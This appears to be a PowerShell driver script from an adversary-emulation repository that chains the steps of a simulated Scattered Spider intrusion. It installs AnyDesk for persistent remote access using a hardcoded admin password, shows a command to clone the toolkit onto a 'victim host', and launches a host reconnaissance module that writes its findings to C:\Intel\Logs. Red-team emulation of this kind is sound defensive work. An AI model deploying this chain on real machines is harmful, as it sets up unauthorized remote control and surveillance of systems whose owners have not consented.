# === Complete Attack Chain Deployment ===
# Simulates full Scattered Spider attack vector for security research
# Phase 1: AnyDesk + Git → Phase 2: Repository Clone → Phase 3: Reconnaissance

param(
    [string]$OrganizationID = "SecurityLab",
    [string]$AdminPassword = "ITSupport2024!",
    [switch]$SkipAnyDesk = $false,
    [switch]$AutoRecon = $false
)

Write-Host "========================================" -ForegroundColor Magenta
Write-Host " SCATTERED SPIDER - COMPLETE CHAIN" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

$currentPath = Get-Location
Write-Host "[*] Current working directory: $currentPath" -ForegroundColor Gray
Write-Host ""

# Phase 1: Initial Foothold (AnyDesk + Git)
if (-not $SkipAnyDesk) {
    Write-Host "=== PHASE 1: INITIAL FOOTHOLD ===" -ForegroundColor Cyan
    Write-Host "[*] Deploying AnyDesk for persistent remote access..." -ForegroundColor Yellow
    
    $anyDeskScript = ".\IT_AnyDesk_Support\IT_AnyDesk_Deployment.ps1"
    if (Test-Path $anyDeskScript) {
        try {
            & $anyDeskScript -OrganizationID $OrganizationID -AdminPassword $AdminPassword
            Write-Host "[+] Phase 1 Complete: Remote access established with Git CLI ready" -ForegroundColor Green
        }
        catch {
            Write-Error "Phase 1 failed: $($_.Exception.Message)"
            exit 1
        }
    } else {
        Write-Error "AnyDesk deployment script not found: $anyDeskScript"
        exit 1
    }
} else {
    Write-Host "=== PHASE 1: SKIPPED (AnyDesk) ===" -ForegroundColor Yellow
    Write-Host "[*] Verifying Git CLI for repository operations..." -ForegroundColor Cyan
    
    try {
        $null = git --version 2>$null
        if ($LASTEXITCODE -eq 0) {
            $gitVersion = git --version
            Write-Host "[+] Git CLI available: $gitVersion" -ForegroundColor Green
        } else {
            Write-Warning "Git CLI not found. Repository cloning may require manual Git installation."
        }
    }
    catch {
        Write-Warning "Git CLI not found. Repository cloning may require manual Git installation."
    }
}

Write-Host ""

# Phase 2: Repository Staging (Simulated)
Write-Host "=== PHASE 2: REPOSITORY STAGING ===" -ForegroundColor Cyan
Write-Host "[*] In real scenario, attacker would now:" -ForegroundColor Yellow
Write-Host "    1. Clone this repository to victim host" -ForegroundColor Gray
Write-Host "    2. Navigate to cloned directory" -ForegroundColor Gray
Write-Host "    3. Execute reconnaissance deployment" -ForegroundColor Gray
Write-Host ""
Write-Host "[*] Repository clone command (for reference):" -ForegroundColor Yellow
Write-Host "    git clone https://github.com/Jonathan-D-a-v-i-d/Scattered_Spider.git" -ForegroundColor Gray
Write-Host "    cd Scattered_Spider" -ForegroundColor Gray
Write-Host ""

# Phase 3: Reconnaissance Deployment
Write-Host "=== PHASE 3: RECONNAISSANCE DEPLOYMENT ===" -ForegroundColor Cyan

$reconScript = ".\Deploy_VictimHostRecon.ps1"
if (Test-Path $reconScript) {
    Write-Host "[*] Deploying victim host reconnaissance..." -ForegroundColor Yellow
    
    try {
        if ($AutoRecon) {
            # Auto-execute reconnaissance
            & $reconScript
            Write-Host ""
            Write-Host "[*] Auto-executing full reconnaissance..." -ForegroundColor Cyan
            Import-Module ".\Recon\Host\VictimHostRecon.psm1" -Force
            Invoke-FullReconnaissance
        } else {
            # Just prepare the module
            & $reconScript
        }
        
        Write-Host "[+] Phase 3 Complete: Reconnaissance capabilities deployed" -ForegroundColor Green
    }
    catch {
        Write-Error "Phase 3 failed: $($_.Exception.Message)"
        exit 1
    }
} else {
    Write-Error "Reconnaissance deployment script not found: $reconScript"
    exit 1
}

Write-Host ""
Write-Host "========================================" -ForegroundColor Magenta
Write-Host " ATTACK CHAIN DEPLOYMENT COMPLETE" -ForegroundColor Magenta
Write-Host "========================================" -ForegroundColor Magenta
Write-Host ""

Write-Host "Summary:" -ForegroundColor Green
if (-not $SkipAnyDesk) {
    Write-Host "✓ Remote access established via AnyDesk" -ForegroundColor Green
}
Write-Host "✓ Git CLI available for repository operations" -ForegroundColor Green
Write-Host "✓ Reconnaissance framework deployed" -ForegroundColor Green
Write-Host "✓ Output directory: C:\Intel\Logs" -ForegroundColor Green
Write-Host ""

Write-Host "Next Steps:" -ForegroundColor Yellow
Write-Host "- Use AnyDesk ID and password for remote connection" -ForegroundColor Gray
Write-Host "- Execute: Run-Recon for full host reconnaissance" -ForegroundColor Gray
Write-Host "- Access results in: C:\Intel\Logs\" -ForegroundColor Gray

if (-not $AutoRecon) {
    Write-Host ""
    $executeRecon = Read-Host "Execute reconnaissance now? (y/N)"
    if ($executeRecon -eq 'y' -or $executeRecon -eq 'Y') {
        Write-Host ""
        Write-Host "[*] Executing full victim host reconnaissance..." -ForegroundColor Cyan
        Import-Module ".\Recon\Host\VictimHostRecon.psm1" -Force
        Invoke-FullReconnaissance
    }
}